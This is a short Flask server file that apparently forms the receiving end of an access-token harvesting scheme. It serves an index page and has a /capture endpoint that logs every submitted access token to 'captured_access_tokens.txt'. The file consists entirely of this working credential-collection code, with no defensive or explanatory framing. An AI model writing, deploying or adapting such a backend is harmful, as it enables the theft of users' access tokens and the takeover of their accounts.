from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/')
def index():
    return app.send_static_file('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    access_token = data.get('access_token', '')
    with open('captured_access_tokens.txt', 'a') as f:
        f.write(access_token + '\n')
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(debug=True)